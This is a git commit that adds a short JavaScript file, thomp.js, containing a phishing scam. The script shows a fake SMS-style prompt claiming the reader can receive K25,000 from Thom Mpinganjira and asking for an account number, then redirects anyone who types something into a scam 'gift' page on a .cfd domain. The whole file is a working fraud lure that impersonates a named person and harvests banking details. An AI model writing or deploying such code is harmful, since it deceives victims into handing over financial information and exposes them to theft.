b27621403f1609131dc35467e088145f6797b196
The-ongoing <preciousadaowo4@gmail.com>
2026-05-19 17:07:06 +0100

    Create thomp.js

---
+++ thomp.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW K25,000'
+password=prompt('SMS: Congratulations, you are eligible to receive K25,000 From Thom Mpinganjira, click OK to Enter Your Acc. Number','WITHDRAW K25,000');
+if (password != 'WITHDRAW K25,000') {
+location.href='https://ongoing-grant.cfd/K25000-Mpinganjira-Gift.html';
+}
